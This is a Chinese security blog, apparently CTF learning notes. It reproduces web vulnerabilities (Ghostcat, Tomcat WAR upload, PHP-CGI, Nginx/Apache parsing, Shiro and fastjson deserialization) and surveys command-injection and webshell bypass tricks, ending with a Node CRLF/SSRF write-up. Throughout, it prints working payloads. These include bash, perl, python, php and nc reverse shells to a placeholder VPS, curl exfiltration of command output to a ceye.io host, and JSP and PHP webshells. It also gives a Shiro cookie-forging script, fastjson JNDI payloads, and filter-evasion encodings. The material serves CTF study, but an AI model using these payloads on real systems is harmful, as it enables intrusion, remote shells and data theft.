out.println(\"Executing command\");Process p = Runtime.getRuntime().exec(\"ls /\");OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) &#123; out.println(disr); disr = dis.readLine(); &#125;%&gt; 使用命令 1python3 ajpShooter.py http:&#x2F;&#x2F;vpsip&#x2F; 8009 &#x2F;WEB-INF&#x2F;exp.jsp eval 尝试了下弹shell的命令失败了。但是问题找不出来。最好在比赛中不要花时间执着于弹shell。可能会有大问题。 补：经郁师傅指点明白了是jsp的问题。具体原因之后解释，简要说主要是java弹shell时使用字符串与字符串数组的区别。 12345&lt;%@ page import=\"java.util.*,java.io.*\"%&gt;&lt;% String[] cmdstr = &#123; \"/bin/bash\", \"-c\", \"bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\" &#125;; Runtime.getRuntime().exec(cmdstr);%&gt; 这样就能弹shell了。 tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞因为WUST那道题过来复现了下。还惊人的重现了：重复使用一个一次性的cookie也会造成403的问题。看来题目果然源于生活。 步骤很简单。第一步tomcat弱口令登入manager/html后台正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。由于后台支持部署war文件，直接上传war即可getshell步骤:1.cmd.jsp 123&lt;% %&gt; jar cvf webshell.war webshell.jsp生成webshell2.命令执行/webshell/exp.jsp?pwd=023&amp;i=id) PHP-CGI远程代码执行漏洞（CVE-2012-1823）出现在以cgi模式运行的php中，影响版本 php &lt; 5.3.12 or php &lt; 5.4.2简单说就是命令行的参数可以通过querysring的形式传入。比如直接传-sindex.php?-s直接回显源码。进一步利用这点，则通过-d使用php://input达成文件包含=&gt;命令执行。payload POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input 1data: &lt;?php echo &#96;ls&#96;; ?&gt; httpdApache HTTPD 多后缀解析漏洞Apache HTTPD 支持一个文件拥有多个后缀假如配置如下 1AddHandler application/x-httpd-php .php 那么在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件所以可以使用上传时加后缀绕过 访问上传1.php.jpg即可发现其被解析为php Apache SSI 远程命令执行漏洞之前接触过的shtml 的命令执行&lt;!--#exec cmd=&quot;ls&quot; --&gt; 之前HITCON2018 WhySoSerial中也有用到它进行文件包含的利用,这也是shtml的Server-Side Includes即ssi的特性了。 Apache HTTPD 换行解析漏洞（CVE-2017-15715）环境有问题…没法复现了大概就是上传php被ban时,通过.php%0a绕过，但是访问文件时时仍能被解析成php nginxNginx 解析漏洞复现这个洞直接帮我解决某入群题困扰了好久的一个点。也解决了我原来在做有关nginx有关服务的题目时遇到的奇特现象。该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞 进入环境。直接上传一个GIF89A&lt;?php @eval($_POST[0]);?&gt;的1.jpg绕过检测，上传图片。 同时访问图片。 但是一旦在jpg后加上/.php这个马就将被作为php解析成功getshell 因此可以用在某些特殊的上传题目中。得到webshell竟可以如此简单,也算是一个小技巧了。 至于原因的话,还是由于nginx的配置问题。一旦配置成把以.php结尾的文件交给fastcgi处理,遇到我们的/.php就直接扔给php了。 且php.ini设置了cgi.fix_pathinfo=1时,fastcgi会自动找到上级的1.jpg处理。最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型这项为空时就会将jpg文件当做代码解析。 所以只要 1、 将php.ini文件中的cgi.fix_pathinfo的值设置为0,这样php再解析1.php/1.jpg这样的目录时,只要1.jpg不存在就会显示404页面 2、 php-fpm.conf中的security.limit_extensions后面的值设置为.php 就可以防止错误解析。 Nginx 文件名逻辑漏洞（CVE-2013-4547）这个跟上面的挺像的，非法字符空格和截止符（\\0）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。http://127.0.0.1/file.aaa \\0.php不用说也知道webshell姿势+1 还有几个配置漏洞就不复现了hhh Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）严格来说自己并没有用vulhub的镜像完成复现.所以自己找了网上其他的复现文章，用了下medicean/vulapps:s_shiro_1这个镜像,姑且是能做了 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。 首先就要准备的是java反序列化的工具ysoserial.自己之前还只用过ysoserial.net。没用过本尊这个java反序列化神器。可以直接去github项目上找已经编译好的jar.或者git clone源码用mvn编译。暂且不提。 然后首先需要构造gadget.我的目的是反弹shell.所以要把反弹shell的代码准备下(注意。java反序列触发反弹shell一定不能直接传命令的字符串，之前ghostcat里也提过了,必须要字符串数组,否则&gt;这样的字符过不去)而此处我们选择base64 加工命令执行代码解决这个问题可以用下面这个网站直接得到编码payloadhttp://www.jackson-t.ca/runtime-exec-payloads.html运行命令 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'BASE64_ENCODED_COMMAND' 这样就起了一个JRMP服务监听6666端口。它会接受被攻击的服务器信息并反序列化，执行gadget对应的命令 接下来就是构造序列化的cookie rememberMe了。首先在登录界面勾选rememberme并抓包，准备替换cookie为我们的利用cookie 利用下面这个脚本生成cookie，参数传攻击ip：java监听端口 123456789101112131415161718import uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(\"kPH+bIxk5D2deZiIxcaaaA==\") iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertext if __name__ == '__main__': payload = encode_rememberme(sys.argv[1]) print \"rememberMe=&#123;0&#125;\".format(payload.decode()) 本质上是利用了shiro默认密钥进行AES加密。所以可见硬编码带来的危害，导致cookie可控即可触发反序列化。生成的cookie替换即可触发反序列化nc监听端口得到反弹shell vulhub的环境不知道为什么弹不到shell,而它给出的方法gadget也完全不一样,不过思路大同小异。就是我的eclipse加载项目半天没搞好… fastjson 1.2.24 反序列化导致任意命令执行漏洞最近莫名感觉java的题多起来了，在观摩其他dalao们的blog时也发现不少内容都在深度研究java的相关漏洞。所以自己也来尝试多复现几个反序列化的洞。至少先当个脚本小子,等到暑假就能好好研究了。 首先是1.2.24的fastjson.这里主要是一个jndi注入。其利用流程如下：首先准备好利用的源码exp.java 123456789101112131415import java.lang.Runtime;import java.lang.Process;public class exp &#123; static &#123; try &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123; \"/bin/bash\", \"-c\", \"bash -i &gt;&amp; /dev/tcp/xxxxxx/9001 0&gt;&amp;1\" &#125;; Process pc = rt.exec(commands); pc.waitFor(); &#125; catch (Exception e) &#123; // do nothing &#125; &#125;&#125; 然后javac exp.java编译好得到exp.class。 而服务端在Content-Type:application/json下,post json数据 1234567&#123; \"b\":&#123; \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://xxx:9999/exp\", \"autoCommit\":true &#125;&#125; 这里用到了marshalsec这个工具。基本上跟ysoserial用起来一样的。拷贝源码maven编译就好接下来启动一个RMI服务器，监听9999端口，并制定加载远程类exp.class 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;xxx&#x2F;#exp&quot; 9999 安全起见,最好还是新建一个文件夹放class文件并用python监听80端口. 本机监听9001端口收到shell. 本质上就是,JdbcRowSetImpl这个类的dataSourceName支持传入一个rmi的源.当解析这个uri的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法。当远程rmi服务找不到对应方法时，可以指定一个远程class让请求方去调用，从而去获取我们恶意构造的class文件，从而RCE。 起一个ldap服务也是一样的,而且ldap似乎比rmi适用性更广。只要改成java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer并把payload中的rmi://换成ldap://即可。 注意下这两个服务利用版本 基于rmi的利用方式：适用jdk版本：JDK 6u132, JDK 7u122, JDK 8u113之前。 基于ldap的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。 Fastjson 1.2.47 远程命令执行漏洞跟上面没啥大区别。环境是openjdk:8u102。同样可以加载rmi 实际上是因为最早的fastjson反序列化也就是上面那个,是支持反序列化任意类的。只要有@type就能做到。而后面的版本主要是禁止了反序列化任意类的操作,并且对可以利用的类加入黑名单而已。Fastjson反序列化漏洞 1.2.24-1.2.48 而这个版本1.2.47的payload则无需开启autotype通杀 1234567891011&#123; \"a\":&#123; \"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\" &#125;, \"b\":&#123; \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://xxxx:9999/Exploit\", \"autoCommit\":true &#125;&#125; 然后跟上面流程一样的直接打,拿到shell.","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"学习笔记-命令执行及花式bypass写shell","slug":"学习笔记-命令执行及花式bypass写shell","date":"2020-03-02T13:57:46.000Z","updated":"2021-02-18T05:08:41.755Z","comments":true,"path":"2020/03/02/学习笔记-命令执行及花式bypass写shell/","link":"","permalink":"https://www.bycsec.top/2020/03/02/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%8A%B1%E5%BC%8Fbypass%E5%86%99shell/","excerpt":"命令执行的坑其实早就想填了。最早是因为校赛时，easyphp一题自己因为不熟悉命令执行的一些特性导致套娃题绕到最后一层却没拿到flag。当时十分不爽，下定决心要好好了解下命令执行的相关知识点。 关于命令执行我大体上归为php绕过+rce两类。php的难点主要是在绕过写shell上，而linux的知识主要在RCE达成上。 先从简单说起：","text":"命令执行的坑其实早就想填了。最早是因为校赛时，easyphp一题自己因为不熟悉命令执行的一些特性导致套娃题绕到最后一层却没拿到flag。当时十分不爽，下定决心要好好了解下命令执行的相关知识点。 关于命令执行我大体上归为php绕过+rce两类。php的难点主要是在绕过写shell上，而linux的知识主要在RCE达成上。 先从简单说起： linux 命令&amp; RCErce,即remote command/code execute。通常都是渗透中希望能够利用的漏洞之一。因为我们可以以此进行命令执行，读取我们想要的文件或者反弹shell。 命令及关键字waf简单的命令执行如DVWA靶场里的command injection 模块。它给了我们一个输入框，而它会将输入框的内容当做命令执行。这样一来我们就可以用命令拼接来执行其他命令。1.使用&amp;&amp; &amp; ;直接多语句执行 123127.0.0.1&amp;&amp;ls127.0.0.1&amp;ls127.0.0.1; ls 2.高级一(亿)点的，使用管道符 1127.0.0.1| ls 管道符的妙用不止这么一点了。比如CTF或实战渗透中都可能用到的 1echo 'Y2F0Cg==' | base64 -d 只要用管道符可以bypass掉绝大部分关键字的waf。实际利用之读flag.php 1echo Y2F0IGZsYWcucGhw|base64 -d|bash bash如果没有可以用sh 1echo Y2F0IGZsYWcucGhw|base64 -d|sh 同时应对关键字waf，linux的特性还允许我们花式绕过对空格 12345678$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行&lt; &lt;&gt; &#123;cat,flag.php&#125; //用逗号实现了空格功能%20 %09 对关键字，如flag，cat，包括上面管道符在内也有很多方法。 12345cat fl* linux中*通配符匹配任意字数echo xxxxxxx| base64 -d ca\\t fla\\gcat fl''aga=f;b=lag;cat $a$b 对命令函数cat的waf,寻找替代也是一种方法，毕竟读取文件函数很多。 12345678head 读头几行tail 读尾几行tac 按行倒着读more lessnlsort...... 如果要奇淫技巧，可以使用如cat `ls`反引号在linux中作为内联执行。将直接输出结果。所以假如我们就在flag的目录下，这是完全可以直接耍的。 以上都是直接在webshell执行读取文件的基础上的。实际上有时候我们在实际渗透中需要的是反弹shell。包括有的题目也是需要shell来找flag的。http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet这个网站总结了常见的反弹shell的方式。实际上总结下常见的几种反弹shell1.bash 1bash -c \"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\" bash式的用到的非常多。然而还是会出现有的容器因为是docker起的而没有bash指令的问题，这种时候通常用sh替代。但是sh并不能反弹shell。所以这就涉及到其他的几种方法。 2.perl 1perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;' 3.python 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 选择python是个不错的替代方式，因为大部分linux机子上都装好了python。(比如题目环境是flask起的时候，肯定是有python了)4.php 1php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' php同理。5.netcat 1nc -e /bin/sh 10.0.0.1 1234 原来看到文章说，所有linux机子都预装好了nc。我觉得是很棒的。不过自己尝试过nc反弹的shell交互性稍微差了一点点。 如果遇到waf，可以用上面普通命令一样的bypass方法解决。或者我们可以如此，使用curl wget等等直接访问我们vps上的提前写好的反弹shell文件。 之于更深一步的命令执行暂且不谈。在渗透中自然会用到的。 bypass长度限制HITCON2017的baby-first-revenge的例子可以说是老例子了。它的bypass长度可以达到5个具体trick是以下这些： 1234ls -t 可以按时间顺序列出所有文件linux 可以用\\进行命令的换行换行不影响命令执行sh _只要四个字符就可以执行命令 然而因为这个解决方案太过高级，导致大家都会了后就不会再有人出这方面的题目考察了…… 盲打 RCE &amp; timebased RCEtime-based RCE是一个常常作为拔高水平的命令执行考点。具体常见于一下代码 123&lt;?php$cmd = $_GET[`cmd`];`$cmd`; 当我们的命令执行没有回显怎么办？常见办法之一当然是利用curl,或者wget把结果打到vps上。有点xxe盲打的味道。只不过并不需要提前放好文件，只要vps监听即可。 1curl http://ip.port.b182oj.ceye.io/`ls` 当然get请求的弊端之一是我们只能打出结果的一行结果，这当然是不行的但是我们可以轻松利用sed命令解决问题。 123curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p`curl http://ip.port.b182oj.ceye.io/`ls | sed -n 2p`curl http://ip.port.b182oj.ceye.io/`ls | sed -n 3p` 将分别打出每一行的信息。进一步还可以打出任意行任意字段内容 123curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1` 截取第一个字curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1-3` 截取第1~3个字curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 2-5` 截取第2~5个 在此基础上也诞生了time-based RCE。原理就如上面一样。因为已经没有回显了，我们在浏览器页面就可以直接构造rce 1if [$(whoami|base32|cut –c 1)=O];then sleep 10;fi 类似sql时间盲注的原理。其中[ ]是linux的条件表达式符号。使用base32是因为我们的返回值可能有特殊字符。这样就完全可以依靠盲打脚本来进行命令执行。 关于linux命令还有些tricks 没有提到，一方面是因为自己了解的毕竟是有限的。另一方面是因为下面的内容中将继续使用到。关于php结合linux命令的一些tricks。 php RCE bypass &amp; 花式写shellphp中的RCE方式可不少。通常最大的难点是写一个webshell出来。而写出webshell后执行命令也会遇到禁用系统函数的情况。这种时候就有许许多多的高级技巧。不仅仅是php的特性问题了，还有许多高级构造。 无参RCE 之所以把无参RCE放到这一块。就是因为无参RCE的利用主要依靠php函数达成。所以小结下常见trick。 123if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) &#123; eval($_GET['code']);&#125; 最早出自于p牛的easyphplimithttps://www.jianshu.com/p/19a37402554f我还在GXYCTF中复现同为无参RCE的题目https://www.jianshu.com/p/2b5e7bd64264其实无参RCE的主要要点就是只能执行如下类型函数 12a(b(c()));a(); 个人第一习惯首先是使用 1print_r(scandir('.')) 探测目录。但此处显然. &#39;&#39;都使用不了。那么怎么构造呢？我们可以轻松使用函数达成 1print_r(scandir(current(localeconv()))); localeconv返回一个数组。其数组头一个值为decimal_point，也就是一个点。 current()起到取出数组第一个变量的作用，所以可以以此替代scandir要用的点。还有一种常规点的做法，只需getcwd()即可返回目录。而dirname()可以往目录上跳。当然，如果想读取的文件在上级目录，就得再加上一个chdir()比如code-breakng的payload 1readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); 其中用到的array_reverse()也是为了应对flag的数组索引不是特殊索引的情况。调整后使用current, next，end可以解决大部分问题。 当然这类无参RCE还有其他用法，比如：1.getenv()函数这一函数将返回一个环境变量的值，而我们需要的是从这个数组中选取需要的值进行利用。常常是： 1array_rand(array_flip(getenv())); 可以随机获取数组中某一个键值。爆破之后能拿到数组中指定值 2.getallheaders() 从http头中获取值。因此十分便捷。比如当http头最后一个值使我们构造好的byc: phpinfo() 1var_dump(end(getallheaders())); 如此即可执行phpinfo()但是注意，这是个apache函数，如果遇到nginx将不再适用。3.get_defined_vars()正是为了应对getallheaders的缺陷，我们可以选择get_defined_vars()。因为它返回的将是全局变量，全局变量包括$_GET $_POST都是可以直接使用的。这样我们就多了一个可以执行命令的函数。比如取出了_GET的话。 1?cmd=eval(end(current(get_defined_vars())));&amp;byc=system('ls'); 甚至我们也能利用$_FILES，通过伪造文件上传达成调用 1234567891011import requestsfrom io import BytesIOpayload = \"system('cat /flag');\".encode('hex')files = &#123; payload: BytesIO('2333!')&#125;r = requests.post('http://localhost/shell.php?cmd=eval(hex2bin(array_rand(end(get_defined_vars()))));', files=files, allow_redirects=False)print (r.text) 使用hex2bin是为了防止关键字的过滤或转换。 4.session_id()函数 与上面的全局变量同样的道理。只不过我们可以利用php的特性。只要是PHPSESSID后的值，就可以直接赋给session_id。既然如此我们只需解决session_id值为字母加数字的问题了。同样使用hex2bin即可前提条件是要先session_start() 12345678import requestsurl = 'http://localhost/shell.php?cmd=eval(hex2bin(session_id(session_start())));'payload = \"echo '23333';\".encode('hex')cookies = &#123; 'PHPSESSID':payload&#125;r = requests.get(url=url,cookies=cookies)print (r.text) 花式写shell花式写shell算是php一个十分考验技巧的点了。当然之前上面linux部分所写的bypass长度也算花式写shell。但是那主要利用的是linux的特性。我们这里尝试使用php的特性，写几种最常见的webshell 1.常规拆分 1cmd=`$_GET[1]`;&amp;1 基本算是用烂了，也是我这种菜鸡最喜欢用的类型。相当与写一个一句话木马。 2.include 1cmd=include$_GET[1];很妙，但是可能会受限于远程文件包含。这个选项默认是不开启的。 3.include升级版为了解决这一问题，我们可以尝试本地文件包含。为此只要file_put_contents()写入一个文件即可 1$_GET[a](N,a,8);&amp;a&#x3D;file_put_contents 其中file_put_contents的第一个参数是文件名。PHP会认为N是一个常量，但之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。由于写入符号时函数会报错，可以选择写入payload的base64,分次写入，最后伪协议包含： 1cmd=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N 4.变长参数+回调后门 p牛给出的无视waf的神招。利用了php5.6的特性。 在PHP中可以使用 func(...$arr)这样的方式，将$arr数组展开成多个参数，传入func函数。所以可以 1cmd=usort(...$_GET); 以下参数get传值。 11[]=test&amp;1[]=phpinfo();&amp;2=assert p牛解释是： 大概过程就是，GET变量被展开成两个参数[‘test’, ‘phpinfo();’]和assert，传入usort函数。usort函数的第二个参数是一个回调函数assert，其调用了第一个参数中的phpinfo();。修改phpinfo();为webshell即可。 这个做法最妙的就是...$_GET绕过waf。 写畸形shellphp的某些特性应该说要先熟悉一下php中大括号的妙处,可变变量的妙处 12345&lt;?php$a=\"hello\";$$a=\"world\";echo \"$a $&#123;$a&#125;\";//hello worldecho \"$a $hello\";//hello world 1$&#123;&quot;_GET&quot;&#125;&#x3D;&#x3D;&#x3D;&#x3D;&gt;$_GET 同时在${}中，字符串如果不带&#39;&#39; ,&quot; &quot;。并不会影响生成以其为名的变量 123php &gt; $a=1111;php &gt; var_dump($&#123;a&#125;);PHP Warning: Use of undefined constant a - assumed 'a' (this will throw an Error in a future version of PHP) in php shell code on line 1 假如我们换成字符串，就会发现它在${}中是会被解析的。 1234$a='b'$&#123;$a&#125;=&gt;$bvar_dump($&#123;$a&#125;);=&gt;var_dump($b);$b='1'=&gt;string(1) \"1\" 因此我们可以明白：$$或${}能利用一个字符串创造出一个同名变量。变量名只能包含字母数字字符以及下划线；但是${}可以使得只包含数字，比如${1}。此时${1}就变成了一个变量。 各种方法 异或这个方法很常见，但是自己还没在实际比赛中用到过……一个非数字字母的后门12345678910&lt;?php @$_++; // $_ = 1 $__=(\"#\"^\"|\"); // $__ = _ $__.=(\".\"^\"~\"); // _P $__.=(\"/\"^\"`\"); // _PO $__.=(\"|\"^\"/\"); // _POS $__.=(\"&#123;\"^\"/\"); // _POST $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);?&gt;$__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"&#123;\"^\"/\"); 其实异或就是字符的ascii转二进制异或后再转ascii转字符串。 2.取反能异或就能取反。位运算牛b。比如p牛的这个例子：&#39;和&#39;{2}的结果&quot;\\x8c&quot;取反是s这里还利用了php中数组可以使用{}替换[]的性质。“和”的第三个字节的值为140[0x8c]，取反的值为-141。负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。 123def get(shell): hexbit=''.join(map(lambda x: hex(~(-(256-ord(x)))),shell)) print(hexbit) 12php &gt; echo(~(\"\\x8f\\x97\\x8f\\x96\\x91\\x99\\x90\"));phpinfo 3.自增运算符自增运算符构造数字也是技巧 1234&lt;?php$_++;print($_);?&gt; $_=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)也是可以得到2的。这点还可以构造数组键值。 4.短标签+通配符 之前在ciscn中遇到过。一个&lt;?php?&gt;算是php的长标签，而&lt;?=?&gt;算短标签。但是这样就可以执行函数了，而且可以通过fuzz达到任意命令执行的效果。由于linux中可以用?来进行单个字母的匹配： 12$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt;/bin/cat /var/www/html/index.php 实际上是应用了linux的glob通配符的作用。既然`可以内联执行。只要能匹配完全就可以达到写shell命令执行的效果。当然，符合匹配结果的命令可能有多个。我们可以加上其他通配符 123[^x] 表示这个位置不是字符x[0-9] 表示数字范围[@-[]表示大写字母 假如匹配到，我们就可以任意命令执行了。 5.php7 动态函数 12(~%8F%97%8F%96%91%99%90)();&#x2F;&#x2F;phpinfo() php7就支持使用($a)();这样的方法来执行动态函数的 暂且写这么多吧。毕竟php的奇妙之处太多了，一时半会是总结不完的。这周末就是第一次以X1c的队员身份打比赛了，要加油啊。 参考文章： https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.htmlhttps://www.leavesongs.com/PHP/bypass-eval-length-restrict.htmlhttps://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/https://skysec.top/2017/12/29/Time-Based-RCE/https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"},{"name":"Linux","slug":"Linux","permalink":"https://www.bycsec.top/tags/Linux/"}]},{"title":"单独填坑-公益赛NodeGame","slug":"单独填坑-公益赛NodeGame","date":"2020-02-26T02:57:14.000Z","updated":"2021-02-18T05:08:30.441Z","comments":true,"path":"2020/02/26/单独填坑-公益赛NodeGame/","link":"","permalink":"https://www.bycsec.top/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/","excerpt":"今天来填下NodeGame的坑吧。这道题确实出的很难。记得当时比赛中也只有大概8位师傅做出来。而实际上，很多师傅应该都是有思路与参考题目，但是最终被小细节所影响的。这里给出出题人自己的出题思路：http://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game其中一道他参考的国际赛题目wp:https://r3billions.com/writeup-split-second/","text":"今天来填下NodeGame的坑吧。这道题确实出的很难。记得当时比赛中也只有大概8位师傅做出来。而实际上，很多师傅应该都是有思路与参考题目，但是最终被小细节所影响的。这里给出出题人自己的出题思路：http://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game其中一道他参考的国际赛题目wp:https://r3billions.com/writeup-split-second/ nullcon hackim-2020 split-second题目源码我fork后单独放在自己github上，有需要自取https://github.com/baiyecha404/hackim-web 先讲解下出题人师傅参考的那道国际赛的题目吧。首先题目的路由跟我们这道NodeGame基本一致，首先从flag路由可以看到 12345678910111213141516171819app.get('/flag', function(req, res) &#123; var ip = req.connection.remoteAddress; if (ip.includes('127.0.0.1')) &#123; var authheader = req.headers['adminauth']; var pug2 = decodeURI(req.headers['pug']); var x=pug2.match(/[a-z]/g); if(!x)&#123; if (authheader === \"secretpassword\") &#123; var html = pug.render(pug2); &#125; &#125; else&#123; res.send(\"No characters\"); &#125; &#125; else&#123; res.send(\"You need to come from localhost\"); &#125;&#125;); core路由是： 12345678910111213141516171819202122232425262728293031323334app.get('/core', function(req, res) &#123; var q = req.query.q; var resp = \"\"; if (q) &#123; var url = 'http://localhost:8081/getMeme?' + q console.log(url) var trigger = blacklist(url); if (trigger === true) &#123; res.send(\"&lt;p&gt;Errrrr, You have been Blocked&lt;/p&gt;\"); &#125; else &#123; try &#123; http.get(url, function(resp) &#123; resp.setEncoding('utf8'); resp.on('error', function(err) &#123; if (err.code === \"ECONNRESET\") &#123; console.log(\"Timeout occurs\"); return; &#125; &#125;); resp.on('data', function(chunk) &#123; resps = chunk.toString(); res.send(resps); &#125;).on('error', (e) =&gt; &#123; res.send(e.message);&#125;); &#125;); &#125; catch (error) &#123; console.log(error); &#125; &#125; &#125; else &#123; res.send(\"search param 'q' missing!\"); &#125;&#125;) 还有一个黑名单函数 12345678910function blacklist(url) &#123; var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125; 以上就是源码中重要部分。除此以外还要先明确一点，题目使用的是Nodejs8.12.版本。并且使用pug作为模板引擎。 123456var express = require('express');var app = express();var fs = require('fs');var path = require('path');var http = require('http');var pug = require('pug'); 这个版本的Nodejs存在什么漏洞呢？如果去搜索会发现存在一个CVE,类型为CRLF injection。具体利用之后再提。现在我们来分析下上述源码的重要之处：1./flag 这是我们的最终目的。一个重点是要达成ip.includes(&#39;127.0.0.1)。说明我们可能需要构造一个ssrf.在ip检查后，还有另一个条件authheader === &quot;secretpassword&quot;进行了http头的检查，达成后将进行pug的渲染，说明可能达成Nodejs的命令执行。而既然要对头进行检查，说明我们确实可能需要CRLF漏洞来进行http头的伪造。 2.core路由允许我们传递参数q。之后与http://localhost:8081/getMeme?拼接，整个url经过一次黑名单检查后将执行。所以上面所需的ssrf在这已经帮我们准备好了。只需考虑绕过即可 3.黑名单从其中存在的关键字就可看出，这是Nodejs常见的命令执行的模板。我们以前用过的Nodejs命令执行payload: 1global.process.mainModule.require('child_process').exec('ls') 将不能直接传入。显然这里需要其他途径来编码绕过。 既然如此我们来复现下,vps上搭好环境：我们的CRLF漏洞，允许我们通过换行构造headers。同时也可以构造拆分ssrf。利用换行结束前一个请求，并发送另一个请求： 123456GET &#x2F;core?q&#x3D;x HTTP&#x2F;1.1GET &#x2F;flag HTTP&#x2F;1.1adminauth: secretpasswordpug: - xxx 那么明确我们需要伪造的文件头 1234567GET &#x2F;flag HTTP&#x2F;1.1Host: 127.0.0.1adminauth: secretpasswordpug: - code dummy: HTTP&#x2F;1.1Host: localhost:8081Connection: close pug处可以执行我们需要执行的命令。而关键headers里的参数已经绕过。既然如此，可以大致写出我们需要用CRLF注入的命令payload： 1SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+CRLF+GET+SPACE+%2F+flag+SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+adminauth+%3A+SPACE+secretpassword+CRLF+pug+%3A+SPACE+aaa+CRLF+dummy+%3A+SPACE 而只需/core?q=payload就执行了SSRF+CRLF。 而为了bypass对pug的渲染问题，我们直接选择8进制绕过。因为它不像unicode或者16进制那样容易包含字母。所以使用八进制绕过。大概如下形式： 123[][\"constructor\"] 有效[][\"\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\"] 